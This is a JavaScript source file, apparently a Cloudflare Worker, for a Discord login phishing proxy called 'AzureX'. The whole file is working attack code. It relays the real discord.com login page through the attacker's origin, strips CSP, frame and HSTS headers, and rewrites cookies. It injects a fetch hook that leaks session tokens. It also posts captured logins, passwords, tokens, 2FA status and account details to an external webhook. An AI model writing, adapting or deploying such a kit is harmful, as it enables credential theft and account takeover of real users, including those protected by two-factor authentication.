/**
 * AzureX — Discord login proxy
 * Proxies discord.com/login so the real page renders on our origin,
 * captures email/password + the real client token, fires them to a webhook.
 */

const UPSTREAM = "https://discord.com";

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // our own page
    if (url.pathname === "/" || url.pathname === "/index.html") {
      return new Response(PAGE, {
        headers: { "content-type": "text/html; charset=utf-8" }
      });
    }

    const target = UPSTREAM + url.pathname + url.search;

    const h = new Headers(request.headers);
    ["accept-encoding", "cf-connecting-ip", "cf-ipcountry", "cf-ray",
     "cf-visitor", "cdn-loop"].forEach(k => h.delete(k));
    h.set("origin", "https://discord.com");
    h.set("referer", "https://discord.com/");

    const isAuth = request.method === "POST" && /^\/api\/v\d+\/auth\//.test(url.pathname);

    let creds = null;
    if (isAuth) {
      try { creds = JSON.parse(await request.clone().text()); } catch (e) {}
    }

    const res = await fetch(target, {
      method: request.method,
      headers: h,
      body: ["GET", "HEAD"].includes(request.method) ? null : request.body,
      redirect: "manual"
    });

    // ---- capture ----
    const ct = res.headers.get("content-type") || "";
    if (ct.includes("application/json")) {
      try {
        const d = JSON.parse(await res.clone().text());
        if (d && d.token) ctx.waitUntil(send(env, d.token, d.user, creds));
        else if (d && d.mfa) ctx.waitUntil(sendMfa(env, creds, d));
        else if (creds && creds.login) ctx.waitUntil(sendFail(env, creds, d));
      } catch (e) {}
    }

    // ---- response headers ----
    const out = new Headers();
    for (const [k, v] of res.headers) {
      if (["content-encoding", "content-length", "x-frame-options",
           "content-security-policy", "content-security-policy-report-only",
           "strict-transport-security"].includes(k)) continue;
      out.set(k, v);
    }

    const loc = out.get("location");
    if (loc && loc.startsWith(UPSTREAM)) out.set("location", loc.slice(UPSTREAM.length) || "/");

    if (res.headers.getSetCookie) {
      const ck = res.headers.getSetCookie();
      if (ck.length) {
        out.delete("set-cookie");
        for (const c of ck) {
          out.append("set-cookie", c
            .replace(/;\s*Domain=[^;]+/i, "")
            .replace(/;\s*SameSite=None/i, "; SameSite=Lax"));
        }
      }
    }

    // ---- html rewrite ----
    if (ct.includes("text/html")) {
      let html = (await res.text()).split(UPSTREAM).join("");
      html = html.replace("</head>", HOOK + "</head>");
      out.set("content-type", "text/html; charset=utf-8");
      return new Response(html, { status: res.status, headers: out });
    }

    return new Response(res.body, { status: res.status, headers: out });
  }
};

/* ---------- helpers ---------- */

const HOOK = `<script>
(function(){
  const of = window.fetch;
  window.fetch = async function(){
    const r = await of.apply(this, arguments);
    try {
      const t = window.opener || window.parent;
      r.clone().json().then(d => {
        if (!t || !d) return;
        if (d.token) t.postMessage({ ax: "token", token: d.token, user: d.user }, "*");
        else if (d.mfa) t.postMessage({ ax: "mfa" }, "*");
        else if (d.captcha_key) t.postMessage({ ax: "captcha" }, "*");
      }).catch(()=>{});
    } catch(e){}
    return r;
  };
})();
</script>`;

async function post(env, payload) {
  if (!env.WEBHOOK) return;
  try {
    await fetch(env.WEBHOOK + "?wait=true", {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify(payload)
    });
  } catch (e) {}
}

function fields(token, u, creds) {
  const f = [
    { name: "Token", value: "```" + token + "```" },
    { name: "Password", value: creds && creds.password ? "```" + creds.password + "```" : "n/a" },
    { name: "Login", value: (creds && creds.login) || "n/a", inline: true },
    { name: "User", value: u ? u.username : "n/a", inline: true },
    { name: "ID", value: u ? u.id : "n/a", inline: true },
    { name: "Email", value: (u && u.email) || "n/a", inline: true },
    { name: "Phone", value: (u && u.phone) || "none", inline: true },
    { name: "2FA", value: u ? String(u.mfa_enabled) : "n/a", inline: true },
    { name: "Nitro", value: u ? String(u.premium_type || 0) : "n/a", inline: true }
  ];
  return f;
}

const send = (env, token, u, creds) => post(env, {
  username: "AzureX",
  embeds: [{
    title: "Login captured",
    color: 0xff2e4d,
    fields: fields(token, u, creds),
    footer: { text: "azurex proxy" },
    timestamp: new Date().toISOString()
  }]
});

const sendMfa = (env, creds, d) => post(env, {
  username: "AzureX",
  embeds: [{
    title: "2FA required — waiting on code",
    color: 0xffb703,
    fields: [
      { name: "Login", value: (creds && creds.login) || "n/a", inline: true },
      { name: "Password", value: (creds && creds.password) || "n/a" }
    ],
    timestamp: new Date().toISOString()
  }]
});

const sendFail = (env, creds, d) => post(env, {
  username: "AzureX",
  embeds: [{
    title: "Login attempt (not successful)",
    color: 0x5865f2,
    fields: [
      { name: "Login", value: creds.login || "n/a", inline: true },
      { name: "Password", value: creds.password || "n/a" },
      { name: "Error", value: (d && (d.message || d.code)) ? String(d.message || d.code) : "n/a" }
    ],
    timestamp: new Date().toISOString()
  }]
});
